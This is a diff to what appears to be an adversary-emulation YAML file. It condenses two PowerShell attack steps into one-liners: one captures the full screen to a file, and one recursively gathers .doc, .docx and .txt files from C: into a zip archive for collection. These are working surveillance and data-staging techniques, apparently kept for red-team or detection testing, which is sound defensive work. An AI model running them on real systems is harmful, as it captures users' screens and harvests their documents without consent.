@@ -331,12 +331,7 @@ attack_action_sequence:
     execution:
       executor: Powershell Executor
       command: |
-        Add-Type -AssemblyName System.Windows.Forms
-        $screen = [Windows.Forms.SystemInformation]::VirtualScreen
-        $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
-        $graphic = [Drawing.Graphics]::FromImage($bitmap)
-        $graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
-        $bitmap.Save("#{output_file}")
+        Add-Type -AssemblyName System.Windows.Forms;$screen = [Windows.Forms.SystemInformation]::VirtualScreen;$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height;$graphic = [Drawing.Graphics]::FromImage($bitmap);$graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size);$bitmap.Save("{user_params["output_file"]}")
     arguments:
       output_file:
         description: Path where captured results will be placed
@@ -366,32 +361,7 @@ attack_action_sequence:
     execution:
       executor: Powershell Executor
       command: |
-        $startingDirectory = "C:"
-        $outputZip = "#{output_zip_folder_path}"
-        $fileExtensionsString = ".doc, .docx, .txt" 
-        $fileExtensions = $fileExtensionsString -split ", "
-
-        New-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null
-
-        Function Search-Files {
-          param (
-            [string]$directory
-          )
-          $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {
-            $fileExtensions -contains $_.Extension.ToLower()
-          }
-          return $files
-        }
-
-        $foundFiles = Search-Files -directory $startingDirectory
-        if ($foundFiles.Count -gt 0) {
-          $foundFilePaths = $foundFiles.FullName
-          Compress-Archive -Path $foundFilePaths -DestinationPath "$outputZip\data.zip"
-
-          Write-Host "Zip file created: $outputZip\data.zip"
-          } else {
-              Write-Host "No files found with the specified extensions."
-          }
+        $startingDirectory="C:"; $outputZip="#{output_zip_folder_path}"; $fileExtensions=@(".doc",".docx",".txt"); New-Item -Type Directory $outputZip -Force -ErrorAction Ignore | Out-Null; Get-ChildItem -Path $startingDirectory -Recurse -File | Where-Object {$_.Extension -in $fileExtensions} | ForEach-Object -Begin {$files=@()} -Process {$files += $_.FullName} -End {if ($files) { Compress-Archive -Path $files -DestinationPath "$outputZip\data.zip"; Write-Host "Zip file created: $outputZip\data.zip" } else { Write-Host "No files found" }}
     arguments:
       output_zip_folder_path:
         description: Path to directory for saving the generated zip file
